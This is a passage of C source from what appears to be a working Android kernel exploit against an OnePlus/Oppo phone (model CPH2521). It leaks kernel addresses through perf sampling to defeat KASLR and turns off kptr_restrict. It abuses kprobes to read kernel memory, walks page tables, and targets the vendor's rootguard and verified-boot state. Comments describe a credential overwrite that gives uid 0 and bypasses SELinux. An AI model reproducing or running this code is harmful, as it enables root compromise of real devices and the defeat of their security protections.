  if (!n || min_kip == ~(uint64_t)0) {
    pr_info("perf text-base: no kernel IP samples\n");
    return 0;
  }

  /* Vote on 2MB-aligned bases (common KASLR granule). */
  uint64_t best_base = 0;
  int best_cnt = 0;
  for (int i = 0; i < n; i++) {
    uint64_t b = ips[i] & ~0x1fffffULL;
    int cnt = 0;
    for (int j = 0; j < n; j++)
      if ((ips[j] & ~0x1fffffULL) == b)
        cnt++;
    if (cnt > best_cnt) {
      best_cnt = cnt;
      best_base = b;
    }
  }
  /* Prefer candidate near link-time KIMAGE (same top bits / plausible slide). */
  uint64_t link = (uint64_t)KIMAGE_TEXT_BASE;
  uint64_t near = min_kip & ~0x1fffffULL;
  if ((best_base >> 40) == (link >> 40) || (near >> 40) == (link >> 40)) {
    if ((near >> 40) == (link >> 40))
      best_base = near;
  }
  pr_info("perf text-base samples=%d min_kip=%016llx text_base=%016llx "
          "votes=%d link=%016llx\n",
          n, (unsigned long long)min_kip, (unsigned long long)best_base,
          best_cnt, (unsigned long long)link);
  return best_base;
}

/* CPH DRAM linear map: P0 + ≤16GB. Z6/Z7 0xffffff87… leaks were toxic. */
static int p0_dram_ptr(uintptr_t v) {
  return v >= (uintptr_t)P0_PAGE_OFFSET &&
         v < (uintptr_t)P0_PAGE_OFFSET + 0x400000000ULL;
}

static void diag_line(int fd, const char *s) {
  pr_info("DIAG %s\n", s ? s : "?");
  live_sync_log("DIAG", s ? s : "?");
  if (fd >= 0 && s) {
    size_t n = strlen(s);
    if (n)
      (void)write(fd, s, n);
    (void)write(fd, "\n", 1);
  }
}

/* After park, SELinux no longer blocks dmesg/kallsyms/packet. Snapshot
 * before the cred punch so a later freeze still leaves a file. */
static void uid0_park_diag(void) {
  int fd = open("/data/local/tmp/uid0_diag.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
  char b[320], line[128];

  read_first_line("/sys/fs/selinux/enforce", line, sizeof(line));
  snprintf(b, sizeof(b), "enforce=%s", line);
  diag_line(fd, b);
  read_first_line("/proc/sys/kernel/kptr_restrict", line, sizeof(line));
  snprintf(b, sizeof(b), "kptr_restrict=%s", line);
  diag_line(fd, b);
  {
    errno = 0;
    int kr = open("/proc/sys/kernel/kptr_restrict", O_WRONLY);
    snprintf(b, sizeof(b), "kptr_wr_open fd=%d errno=%d", kr, errno);
    diag_line(fd, b);
    if (kr >= 0) {
      errno = 0;
      ssize_t nw = write(kr, "0\n", 2);
      snprintf(b, sizeof(b), "kptr_wr n=%zd errno=%d", nw, errno);
      diag_line(fd, b);
      close(kr);
      read_first_line("/proc/sys/kernel/kptr_restrict", line, sizeof(line));
      snprintf(b, sizeof(b), "kptr_restrict_after=%s", line);
      diag_line(fd, b);
    }
  }
  read_first_line("/proc/sys/kernel/dmesg_restrict", line, sizeof(line));
  snprintf(b, sizeof(b), "dmesg_restrict=%s", line);
  diag_line(fd, b);
  read_first_line("/proc/sys/kernel/perf_event_paranoid", line, sizeof(line));
  snprintf(b, sizeof(b), "perf_event_paranoid=%s", line);
  diag_line(fd, b);

  errno = 0;
  int kf = open("/proc/kallsyms", O_RDONLY);
  snprintf(b, sizeof(b), "kallsyms_open fd=%d errno=%d", kf, errno);
  diag_line(fd, b);
  if (kf >= 0) {
    char ks[240] = {0};
    ssize_t n = read(kf, ks, sizeof(ks) - 1);
    snprintf(b, sizeof(b), "kallsyms_head n=%zd %.80s", n, ks);
    diag_line(fd, b);
    close(kf);
  }

  errno = 0;
  int pg = open("/proc/kpageflags", O_RDONLY);
  snprintf(b, sizeof(b), "kpageflags fd=%d errno=%d", pg, errno);
  diag_line(fd, b);
  if (pg >= 0)
    close(pg);

  errno = 0;
  int ps = socket(AF_PACKET, SOCK_RAW, 0);
  snprintf(b, sizeof(b), "AF_PACKET fd=%d errno=%d", ps, errno);
  diag_line(fd, b);
  if (ps >= 0)
    close(ps);

  errno = 0;
  int km = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
  snprintf(b, sizeof(b), "kmsg fd=%d errno=%d", km, errno);
  diag_line(fd, b);
  if (km >= 0)
    close(km);

  {
    char dmesg[2048];
    errno = 0;
    long sl = syscall(__NR_syslog, 3, dmesg, (long)sizeof(dmesg) - 1);
    snprintf(b, sizeof(b), "syslog_read n=%ld errno=%d", sl, errno);
    diag_line(fd, b);
    if (sl > 80) {
      dmesg[sl < (long)sizeof(dmesg) ? (size_t)sl : sizeof(dmesg) - 1] = 0;
      char *tail = dmesg;
      if (sl > 400)
        tail = dmesg + sl - 400;
      snprintf(b, sizeof(b), "dmesg_tail %.240s", tail);
      diag_line(fd, b);
    }
  }

  snprintf(b, sizeof(b), "page_base=%016zx fake_lock=%016zx cred_copy=%016zx",
           page_base, fake_lock, g_cred_copy);
  diag_line(fd, b);
  if (fd >= 0)
    close(fd);
}

static int perf_open_hw(int pid, struct perf_event_attr *pe, const char **mode);

/* After park, dump oplus rootguard/kevent symbols. No extra pselect walk. */
static void uid0_harvest_rootguard(void) {
  static const char *outs[] = {"/data/local/tmp/rootguard_syms.txt",
                               "/sdcard/ghostlock/aarif/rootguard_syms.txt"};
  char line[320];
  int nmatch = 0, nline = 0, hashed = 0;
  FILE *ks = fopen("/proc/kallsyms", "r");
  FILE *mod = fopen("/proc/modules", "r");
  int ofd[2];
  size_t i;

  for (i = 0; i < 2; i++)
    ofd[i] = open(outs[i], O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);

  pr_info("UID0 harvest rootguard kallsyms\n");
  live_sync_log("UID0", "harvest_rootguard");
  if (!ks) {
    pr_info("UID0 kallsyms fopen errno=%d\n", errno);
    for (i = 0; i < 2; i++)
      if (ofd[i] >= 0)
        close(ofd[i]);
    if (mod)
      fclose(mod);
    return;
  }
  while (fgets(line, sizeof(line), ks) && nmatch < 120) {
    nline++;
    if (nline <= 3 && line[0] == '0')
      hashed++;
    if (!strstr(line, "is_unlocked") && !strstr(line, "g_boot_state") &&
        !strstr(line, "verified_bootstate") && !strstr(line, "oplus_root") &&
        !strstr(line, "kevent_send") && !strstr(line, "oplus_kevent") &&
        !strstr(line, "secure_guard") && !strstr(line, "oplus_security") &&
        !strstr(line, "oplus_hook") && !strstr(line, "root_check") &&
        !strstr(line, "oplus_root_killed") && !strstr(line, "KEVENT_ROOT") &&
        !strstr(line, "oplus_guard") && !strstr(line, "android_kabi"))
      continue;
    nmatch++;
    pr_info("UID0 SYM %s", line);
    for (i = 0; i < 2; i++)
      if (ofd[i] >= 0)
        (void)write(ofd[i], line, strlen(line));
  }
  fclose(ks);
  {
    char hdr[80];
    int n = snprintf(hdr, sizeof(hdr),
                     "# nline=%d nmatch=%d hashed_head=%d\n", nline, nmatch,
                     hashed);
    if (n > 0)
      for (i = 0; i < 2; i++)
        if (ofd[i] >= 0)
          (void)write(ofd[i], hdr, (size_t)n);
  }
  if (mod) {
    const char *mh = "# /proc/modules\n";
    for (i = 0; i < 2; i++)
      if (ofd[i] >= 0)
        (void)write(ofd[i], mh, strlen(mh));
    while (fgets(line, sizeof(line), mod)) {
      if (!strstr(line, "oplus") && !strstr(line, "kevent") &&
          !strstr(line, "secure"))
        continue;
      pr_info("UID0 MOD %s", line);
      for (i = 0; i < 2; i++)
        if (ofd[i] >= 0)
          (void)write(ofd[i], line, strlen(line));
    }
    fclose(mod);
  }
  for (i = 0; i < 2; i++)
    if (ofd[i] >= 0)
      close(ofd[i]);
  pr_info("UID0 harvest done nmatch=%d nline=%d\n", nmatch, nline);
}

/*
 * oplus_security_guard.ko (Z43 ELF, 5.10 STRICT_MODULE_RWX core layout):
 *   .text @0 (0xfe0), RO through ~0x23a8 → page 0x3000,
 *   .data..ro_after_init @0x3000 (g_boot_state, 1 byte, rest of page pad).
 * is_unlocked is LDRB + RET — any nonzero byte is ORANGE.
 * Hook text: pre 0x3ac, post 0x3e8, is_unlocked 0x4b4.
 * Z44: kptr VALUE 0xffffff8100000000 is live DRAM, not a zero rb_node → KP.
 */
#define GBOOT_CORE_OFF 0x3000ULL
#define HOOK_TEXT_LO 0x3acU
#define HOOK_TEXT_HI 0x4c8U
/* Live PCs are KASLR'd in 0xffffffe4… (Z45). File kallsyms 0xffffffc0 is not
 * the runtime instruction VA. Module .text is an outlier page in that window
 * with IPs at post 0x3e8 / pre 0x3ac (Z45: ffffffe466c173e8). */

static uintptr_t uid0_harvest_modip(void) {
  const char *mode = "none";
  struct perf_event_attr pe;
  int fd;
  uintptr_t gboot = 0, text_base = 0;
  int n_samp = 0, n_mod = 0, n_hook = 0;
  char line[160];

  pr_info("UID0 harvest modip (perf IP + sysfs sections)\n");
  live_sync_log("UID0", "harvest_modip");

  {
    static const char *secs[] = {
        "/sys/module/oplus_security_guard/sections/.data..ro_after_init",
        "/sys/module/oplus_security_guard/sections/.text",
        "/sys/module/oplus_security_guard/sections/.bss",
    };
    size_t si;
    for (si = 0; si < sizeof(secs) / sizeof(secs[0]); si++) {
      memset(line, 0, sizeof(line));
      errno = 0;
      read_first_line(secs[si], line, sizeof(line));
      pr_info("UID0 sysfs %s errno=%d [%.80s]\n", secs[si], errno, line);
      if (!gboot && line[0]) {
        uintptr_t v = (uintptr_t)strtoull(line, NULL, 0);
        if (v > 0xffffffc000000000ULL && v < 0xffffffc008000000ULL) {
          if (strstr(secs[si], "ro_after_init"))
            gboot = v;
          else if (strstr(secs[si], ".text") && !text_base)
            text_base = v & ~0xfffULL;
        }
      }
    }
  }
  {
    FILE *cf = popen("toybox zcat /proc/config.gz 2>/dev/null", "r");
    if (cf) {
      int ncfg = 0;
      while (fgets(line, sizeof(line), cf) && ncfg < 12) {
        if (!strstr(line, "MODULE") && !strstr(line, "KASLR") &&
            !strstr(line, "STRICT") && !strstr(line, "IKCONFIG"))
          continue;
        if (strstr(line, "STRICT_MODULE") || strstr(line, "MODULE_RWX") ||
            strstr(line, "RANDOMIZE_MODULE") || strstr(line, "MODULE_UNLOAD") ||
            strstr(line, "IKCONFIG") || strstr(line, "KPROBE") ||
            strstr(line, "FTRACE") || strstr(line, "PTDUMP")) {
          ncfg++;
          pr_info("UID0 CFG %.80s", line);
        }
      }
      pclose(cf);
    }
  }

  fd = perf_open_hw(0, &pe, &mode);
  if (fd < 0) {
    pr_info("UID0 modip perf open fail mode=%s\n", mode);
    if (!gboot && text_base)
      gboot = text_base + GBOOT_CORE_OFF;
    pr_info("UID0 GBOOT guess=%016zx text=%016zx\n", gboot, text_base);
    return gboot;
  }
  {
    size_t msz = 4096 * (1 + 32);
    void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    uintptr_t pages[24];
    int pc[24];
    int hc[24];
    int np = 0;
    memset(pc, 0, sizeof(pc));
    memset(hc, 0, sizeof(hc));
    if (buf == MAP_FAILED) {
      pr_info("UID0 modip mmap errno=%d\n", errno);
      close(fd);
      if (!gboot && text_base)
        gboot = text_base + GBOOT_CORE_OFF;
      return gboot;
    }
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    {
      int i;
      for (i = 0; i < 3000000; i++)
        syscall(__NR_getpid);
    }
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    {
      struct perf_event_mmap_page *hdr = buf;
      uint64_t head = hdr->data_head;
      char *base = (char *)buf + 4096;
      size_t dsz = 4096 * 32;
      uint64_t pos = hdr->data_tail;
      __sync_synchronize();
      while (pos < head) {
        struct perf_event_header *ev = (void *)(base + (pos % dsz));
        uint64_t ip;
        unsigned off;
        int i, found;
        if (ev->size == 0)
          break;
        if (ev->type != PERF_RECORD_SAMPLE) {
          pos += ev->size;
          continue;
        }
        ip = *(uint64_t *)((char *)ev + sizeof(*ev));
        n_samp++;
        if (n_samp <= 6)
          pr_info("UID0 RAWIP %016llx\n", (unsigned long long)ip);
        /* File kallsyms 0xffffffc0 is not the runtime PC. Z45=0xffffffe4,
         * Z46=0xffffffd5 — accept any kernel canonical IP. */
        if (ip < 0xffff000000000000ULL) {
          pos += ev->size;
          continue;
        }
        n_mod++;
        off = (unsigned)(ip & 0xfffU);
        found = -1;
        for (i = 0; i < np; i++)
          if (pages[i] == (ip & ~0xfffULL)) {
            found = i;
            break;
          }
        if (found >= 0)
          pc[found]++;
        else if (np < 24) {
          pages[np] = ip & ~0xfffULL;
          pc[np] = 1;
          hc[np] = 0;
          found = np;
          np++;
        }
        if (found >= 0 && off >= HOOK_TEXT_LO && off < HOOK_TEXT_HI) {
          hc[found]++;
          n_hook++;
          if (n_hook <= 12)
            pr_info("UID0 HOOKIP %016llx off=%03x\n",
                    (unsigned long long)ip, off);
        }
        pos += ev->size;
      }
      hdr->data_tail = head;
      {
        int pi, best = -1, bh = 0, hot = 0;
        for (pi = 0; pi < np; pi++) {
          pr_info("UID0 MODPAGE %016zx n=%d hook=%d\n", pages[pi], pc[pi],
                  hc[pi]);
          if (pc[pi] > pc[hot])
            hot = pi;
        }
        for (pi = 0; pi < np; pi++) {
          if (pi == hot)
            continue;
          if (hc[pi] > bh) {
            bh = hc[pi];
            best = pi;
          }
        }
        if (best >= 0 && bh >= 2)
          text_base = pages[best];
      }
    }
    munmap(buf, msz);
    close(fd);
  }
  pr_info("UID0 modip mode=%s samp=%d mod=%d hook=%d text=%016zx\n", mode,
          n_samp, n_mod, n_hook, text_base);
  if (!gboot && text_base && n_hook >= 2)
    gboot = text_base + GBOOT_CORE_OFF;
  pr_info("UID0 GBOOT va=%016zx (core+0x3000, n_hook=%d)\n", gboot, n_hook);
  return gboot;
}

/* Translate module VA → physmap P0. Z47 wrote the RO vmalloc PTE and KPd.
 * 5.10 perf_virt_to_phys() returns 0 for VMALLOC — try a kernel read-watch
 * on the LDRB anyway (paranoid=-1 after park). RAM phys → P0. */
#ifndef PERF_TYPE_BREAKPOINT
#define PERF_TYPE_BREAKPOINT 5
#endif
#ifndef HW_BREAKPOINT_R
#define HW_BREAKPOINT_R 1
#endif
#ifndef HW_BREAKPOINT_LEN_1
#define HW_BREAKPOINT_LEN_1 1
#endif

static int uid0_write_str(const char *path, const char *s) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  ssize_t n;
  if (fd < 0)
    return -errno;
  n = write(fd, s, strlen(s));
  close(fd);
  return n < 0 ? -errno : 0;
}

static int uid0_kprobe_read64(uintptr_t kaddr, uint64_t *out) {
  static const char *const roots[] = {"/sys/kernel/tracing",
                                      "/sys/kernel/debug/tracing"};
  static const char *const probes[] = {"__traceiter_sys_exit", "el0_svc",
                                       "do_el0_svc"};
  char ke[80], en[96], tr[80], line[256], cmd[192];
  int ri, pi, fd, ntry;
  *out = 0;
  for (ri = 0; ri < 2; ri++) {
    snprintf(ke, sizeof(ke), "%s/kprobe_events", roots[ri]);
    if (access(ke, W_OK) != 0) {
      pr_info("UID0 kprobe %s W_OK errno=%d\n", ke, errno);
      continue;
    }
    snprintf(en, sizeof(en), "%s/events/kprobes/glrd/enable", roots[ri]);
    snprintf(tr, sizeof(tr), "%s/trace", roots[ri]);
    for (pi = 0; pi < 3; pi++) {
      uid0_write_str(ke, "-:glrd\n");
      snprintf(cmd, sizeof(cmd), "p:glrd %s v=@0x%zx\n", probes[pi], kaddr);
      if (uid0_write_str(ke, cmd) != 0) {
        pr_info("UID0 kprobe add '%s' errno=%d\n", cmd, errno);
        continue;
      }
      uid0_write_str(tr, "\n");
      if (uid0_write_str(en, "1\n") != 0) {
        pr_info("UID0 kprobe enable errno=%d\n", errno);
        uid0_write_str(ke, "-:glrd\n");
        continue;
      }
      for (ntry = 0; ntry < 200000; ntry++)
        syscall(__NR_getpid);
      uid0_write_str(en, "0\n");
      fd = open(tr, O_RDONLY | O_CLOEXEC);
      if (fd >= 0) {
        char buf[4096];
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
          char *hit;
          buf[n] = 0;
          hit = strstr(buf, "v=0x");
          if (!hit)
            hit = strstr(buf, "v=");
          if (hit) {
            *out = strtoull(hit + 2, NULL, 0);
            pr_info("UID0 kpread %016zx -> %016llx via %s\n", kaddr,
                    (unsigned long long)*out, probes[pi]);
            uid0_write_str(ke, "-:glrd\n");
            return 0;
          }
          buf[sizeof(line) - 1] = 0;
          snprintf(line, sizeof(line), "%.80s", buf);
          pr_info("UID0 kprobe trace no v= [%.80s]\n", line);
        }
      }
      uid0_write_str(ke, "-:glrd\n");
    }
  }
  return -1;
}

#define PTE_VALID 1ULL
#define PTE_TABLE 2ULL
#define PTE_ADDR_MASK 0x0000fffffffff000ULL
#define PGDIR_SHIFT 30
#define PMD_SHIFT 21

static uintptr_t uid0_pgt_next_p0(uint64_t desc) {
  uint64_t phys = desc & PTE_ADDR_MASK;
  if (phys < 0x80000000ULL || phys >= 0x380000000ULL)
    return 0;
  return (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
}

static uintptr_t uid0_walk_mod_p0(uintptr_t va) {
  uint64_t pgd_off = 0x2491000ULL; /* swapper_pg_dir - _text, kallsyms */
  uintptr_t pgd_p0 = data_addr(KIMAGE_TEXT_BASE + pgd_off);
  unsigned pgd_i = (unsigned)((va >> PGDIR_SHIFT) & 0x1ffU);
  unsigned pmd_i = (unsigned)((va >> PMD_SHIFT) & 0x1ffU);
  unsigned pte_i = (unsigned)((va >> PAGE_SHIFT) & 0x1ffU);
  uint64_t pgd = 0, pmd = 0, pte = 0;
  uintptr_t p0;

  pr_info("UID0 ptwalk va=%016zx pgd_p0=%016zx idx=%u/%u/%u\n", va, pgd_p0,
          pgd_i, pmd_i, pte_i);
  if (uid0_kprobe_read64(pgd_p0 + (uintptr_t)pgd_i * 8, &pgd) || !pgd) {
    pr_info("UID0 ptwalk pgd read fail pgd=%016llx\n", (unsigned long long)pgd);
    return 0;
  }
  pr_info("UID0 ptwalk pgd=%016llx\n", (unsigned long long)pgd);
  if (!(pgd & PTE_VALID))
    return 0;
  if (!(pgd & PTE_TABLE)) {
    /* 1GB block */
    uint64_t phys = (pgd & PTE_ADDR_MASK) | (va & 0x3fffffffULL);
    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
    pr_info("UID0 ptwalk 1G block p0=%016zx\n", p0);
    return p0;
  }
  p0 = uid0_pgt_next_p0(pgd);
  if (!p0 || uid0_kprobe_read64(p0 + (uintptr_t)pmd_i * 8, &pmd) || !pmd) {
    pr_info("UID0 ptwalk pmd read fail pmd=%016llx\n", (unsigned long long)pmd);
    return 0;
  }
  pr_info("UID0 ptwalk pmd=%016llx\n", (unsigned long long)pmd);
  if (!(pmd & PTE_VALID))
    return 0;
  if (!(pmd & PTE_TABLE)) {
    uint64_t phys = (pmd & PTE_ADDR_MASK) | (va & 0x1fffffULL);
    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
    pr_info("UID0 ptwalk 2M block p0=%016zx\n", p0);
    return p0;
  }
  p0 = uid0_pgt_next_p0(pmd);
  if (!p0 || uid0_kprobe_read64(p0 + (uintptr_t)pte_i * 8, &pte) || !pte) {
    pr_info("UID0 ptwalk pte read fail pte=%016llx\n", (unsigned long long)pte);
    return 0;
  }
  pr_info("UID0 ptwalk pte=%016llx\n", (unsigned long long)pte);
  if (!(pte & PTE_VALID))
    return 0;
  {
    uint64_t phys = (pte & PTE_ADDR_MASK) | (va & 0xfffULL);
    if (phys < 0x80000000ULL || phys >= 0x380000000ULL) {
      pr_info("UID0 ptwalk phys out of RAM %016llx\n",
              (unsigned long long)phys);
      return 0;
    }
    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
    pr_info("UID0 ptwalk page p0=%016zx phys=%016llx\n", p0,
            (unsigned long long)phys);
    return p0;
  }
}

static uintptr_t uid0_gboot_to_p0(uintptr_t va) {
  struct perf_event_attr pe;
  int fd, i, ns = 0;
  uintptr_t p0 = 0;
  uint64_t phys_seen = 0;

  if (!va)
    return 0;
  p0 = uid0_walk_mod_p0(va);
  if (p0)
    return p0;
  memset(&pe, 0, sizeof(pe));
  pe.size = sizeof(pe);
  pe.type = PERF_TYPE_BREAKPOINT;
  pe.sample_period = 1;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_ADDR | PERF_SAMPLE_PHYS_ADDR;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.bp_addr = va;
  pe.bp_len = HW_BREAKPOINT_LEN_1;
  pe.bp_type = HW_BREAKPOINT_R;
  errno = 0;
  fd = (int)syscall(__NR_perf_event_open, &pe, 0L, -1, -1, 0);
  pr_info("UID0 gboot_bp fd=%d errno=%d va=%016zx\n", fd, errno, va);
  if (fd < 0)
    return 0;
  {
    size_t msz = 4096 * 9;
    void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) {
      pr_info("UID0 gboot_bp mmap errno=%d\n", errno);
      close(fd);
      return 0;
    }
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (i = 0; i < 2000000; i++)
      syscall(__NR_getpid);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    {
      struct perf_event_mmap_page *hdr = buf;
      uint64_t head = hdr->data_head;
      char *base = (char *)buf + 4096;
      size_t dsz = 4096 * 8;
      uint64_t pos = hdr->data_tail;
      __sync_synchronize();
      while (pos < head && ns < 32) {
        struct perf_event_header *ev = (void *)(base + (pos % dsz));
        char *p;
        uint64_t ip, addr, phys;
        if (ev->size == 0)
          break;
        if (ev->type != PERF_RECORD_SAMPLE) {
          pos += ev->size;
          continue;
        }
        p = (char *)ev + sizeof(*ev);
        ip = *(uint64_t *)p;
        p += 8;
        addr = *(uint64_t *)p;
        p += 8;
        phys = *(uint64_t *)p;
        ns++;
        if (ns <= 8)
          pr_info("UID0 gboot_bp ip=%016llx addr=%016llx phys=%016llx\n",
                  (unsigned long long)ip, (unsigned long long)addr,
                  (unsigned long long)phys);
        if (phys >= 0x80000000ULL && phys < 0x380000000ULL)
          phys_seen = phys;
        pos += ev->size;
      }
    }
    munmap(buf, msz);
  }
  close(fd);
  if (phys_seen) {
    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys_seen - P0_PHYS_OFFSET));
    pr_info("UID0 gboot_p0 %016zx phys=%016llx (from bp, n=%d)\n", p0,
            (unsigned long long)phys_seen, ns);
  } else
    pr_info("UID0 gboot_p0 none (nsamp=%d) — not punching RO module VA\n", ns);
  return p0;
}

/*
 * Z18: parent and child majority-voted the same P0 VA — a hot shared
 * kernel object, not task_struct (that VA was only 16-byte aligned).
 * Collect a histogram, then take set-difference vs the other process.
 * pid>0 attaches to that tgid (parent must yield; child busy-loops).
 */
#define PERF_MAX_CAND 256
#define PERF_MAX_UNIQ 16
/* CPH2521 Image kallsyms (kptr hashed on-device; file is unhashed). */
#define OFF_SYS_GETPID 0x0165d20ULL
#define LEN_SYS_GETPID 0xC0ULL
#define OFF_EL0_SVC_COMMON 0x0096728ULL
#define LEN_EL0_SVC_COMMON 0x270ULL

struct perf_leak {
  uintptr_t best;
  int best_cnt;
  int nc;
  int n_hi;
  int n_samp;
  int n_getpid;
  int n_svc;
  uintptr_t x0;
  int x0_cnt;
  uintptr_t x28;
  int x28_cnt;
  uintptr_t uniq[PERF_MAX_UNIQ];
  int uniq_cnt[PERF_MAX_UNIQ];
  int nuniq;
};

/* Park-boot leak_probe: PERF_TYPE_HARDWARE = EOPNOTSUPP (95).
 * armv8_pmuv3 type=8, inst_retired event=0x8. x28 is per-task, 64-aligned,
 * 100% stable, parent≠child (not the ffffff80 P0 window — ffffff87/88). */
static int pmu_type_armv8(void) {
  int t = 8;
  FILE *f = fopen("/sys/bus/event_source/devices/armv8_pmuv3/type", "r");
  if (f) {
    if (fscanf(f, "%d", &t) != 1)
      t = 8;
    fclose(f);
  }
  return t;
}

static int task_ptr_ok(uintptr_t v) {
  if ((v & 0x3f) != 0)
    return 0;
  /* Linear + high aliases. Exclude ffffffc0 vmap stacks and ffffffd7 trampolines. */
  return v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL;
}

static int perf_open_hw(int pid, struct perf_event_attr *pe, const char **mode) {
  int pmu = pmu_type_armv8();
  /* Kernel-only PMU is EACCES under Enforcing. User-only (xk=1) still
   * delivers kernel REGS_INTR.x28=current on syscall samples — proven
   * 2026-08-29 on CPH2521 (child getuid 0 after cred punch). */
  int tries[6][4];
  const char *names[6];
  int ntry = 0;
  /* pid, cpu, exclude_user, exclude_kernel */
  tries[ntry][0] = pid; tries[ntry][1] = -1; tries[ntry][2] = 0; tries[ntry][3] = 1;
  names[ntry++] = "pmu8_user_xk";
  tries[ntry][0] = pid; tries[ntry][1] = -1; tries[ntry][2] = 1; tries[ntry][3] = 0;
  names[ntry++] = "pmu8_inst";
  tries[ntry][0] = pid; tries[ntry][1] = -1; tries[ntry][2] = 0; tries[ntry][3] = 0;
  names[ntry++] = "pmu8_both";
  int i, e1 = 0, e2 = 0;
  for (i = 0; i < ntry; i++) {
    memset(pe, 0, sizeof(*pe));
    pe->size = sizeof(*pe);
    pe->disabled = 1;
    pe->exclude_user = tries[i][2];
    pe->exclude_kernel = tries[i][3];
    pe->exclude_hv = 1;
    pe->sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    pe->sample_regs_intr = (1ULL << 33) - 1;
    pe->type = (uint32_t)pmu;
    pe->config = 0x8;
    pe->sample_period = 800;
    errno = 0;
    int fd = (int)syscall(__NR_perf_event_open, pe, (long)tries[i][0],
                          tries[i][1], -1, 0);
    if (fd >= 0) {
      *mode = names[i];
      return fd;
    }
    if (i == 0)
      e1 = errno;
    pe->config = 0x11;
    errno = 0;
    fd = (int)syscall(__NR_perf_event_open, pe, (long)tries[i][0],
                      tries[i][1], -1, 0);
    if (fd >= 0) {
      *mode = "pmu8_cyc";
      return fd;
    }
    if (i == 0)
      e2 = errno;
  }
  pr_info("perf pmu type=%d pid=%d inst_errno=%d cyc_errno=%d\n", pmu, pid, e1,
          e2);
  *mode = "none";
  return -1;
}

static void leak_add(struct perf_leak *out, uintptr_t v) {
  int found = -1;
  for (int u = 0; u < out->nuniq; u++) {
    if (out->uniq[u] == v) {
      found = u;
      break;
    }
  }
  if (found >= 0)
    out->uniq_cnt[found]++;
  else if (out->nuniq < PERF_MAX_UNIQ) {
    out->uniq[out->nuniq] = v;
    out->uniq_cnt[out->nuniq] = 1;
    out->nuniq++;
  }
}

static int perf_collect(int pid, struct perf_leak *out) {
  memset(out, 0, sizeof(*out));
  const char *mode = "none";
  struct perf_event_attr pe;
  int fd = perf_open_hw(pid, &pe, &mode);
  if (fd < 0)
    return -1;
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_info("perf mmap pid=%d errno=%d\n", pid, errno);
    close(fd);
    return -1;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  if (pid > 0) {
    for (int i = 0; i < 400; i++) {
      struct timespec ts = {0, 2000000L};
      nanosleep(&ts, NULL);
    }
  } else {
    for (volatile int i = 0; i < 800000; i++)
      syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  uint64_t getpid_lo = (uint64_t)text_addr(KIMAGE_TEXT_BASE + OFF_SYS_GETPID);
  uint64_t getpid_hi = getpid_lo + LEN_SYS_GETPID;
  uint64_t svc_lo = (uint64_t)text_addr(KIMAGE_TEXT_BASE + OFF_EL0_SVC_COMMON);
  uint64_t svc_hi = svc_lo + LEN_EL0_SVC_COMMON;

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  int n_hi = 0, n_samp = 0, n_ip_log = 0;
  uintptr_t x28s[PERF_MAX_CAND];
  int nx28 = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0)
      break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip = *(uint64_t *)p;
      p += 8;
      n_samp++;
      int in_getpid = (ip >= getpid_lo && ip < getpid_hi);
      int in_svc = (ip >= svc_lo && ip < svc_hi);
      if (in_getpid)
        out->n_getpid++;
      if (in_svc)
        out->n_svc++;
      if (n_ip_log < 4) {
        pr_info("  ip[%d]=%016llx getpid=%d svc=%d\n", n_ip_log,
                (unsigned long long)ip, in_getpid, in_svc);
        n_ip_log++;
      }
      uint64_t abi = *(uint64_t *)p;
      p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        uint64_t r28 = regs[28];
        /* User-only PMU still samples kernel IPs (ffffffdc…) with
         * x28=current. Ignore userspace x28. */
        int ker_ip = (ip >= 0xffffffc000000000ULL);
        if (ker_ip && task_ptr_ok((uintptr_t)r28) && nx28 < PERF_MAX_CAND)
          x28s[nx28++] = (uintptr_t)r28;
        for (int i = 0; i < 33; i++) {
          uint64_t v = regs[i];
          if (p0_dram_ptr(v))
            leak_add(out, (uintptr_t)v);
          else if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            n_hi++;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);
  out->nc = 0;
  for (int u = 0; u < out->nuniq; u++)
    out->nc += out->uniq_cnt[u];
  out->n_hi = n_hi;
  out->n_samp = n_samp;
  if (nx28) {
    uintptr_t bx = 0;
    int bc = 0;
    for (int i = 0; i < nx28; i++) {
      int c = 0;
      for (int j = 0; j < nx28; j++)
        if (x28s[j] == x28s[i])
          c++;
      if (c > bc) {
